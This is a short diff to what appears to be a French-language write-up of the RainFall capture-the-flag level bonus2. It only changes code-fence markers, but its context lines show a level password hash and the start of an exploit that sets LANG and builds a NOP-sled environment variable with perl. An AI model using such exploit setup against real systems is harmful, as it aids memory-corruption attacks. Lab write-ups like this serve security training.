@@ -3,7 +3,7 @@
 pass : `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
 
 ## Sources :
-```c=
+```c
 #include <string.h>
 #include <stdlib.h>
 
@@ -113,7 +113,7 @@ On est bon !
 
 ## Exploit :
 
-```shell=
+```shell
 export LANG="fi"; export EXPLOIT="$(perl -e 'print "\x90"x50 . ""')
 
 bonus2@RainFall:~$ export LANG="fi"
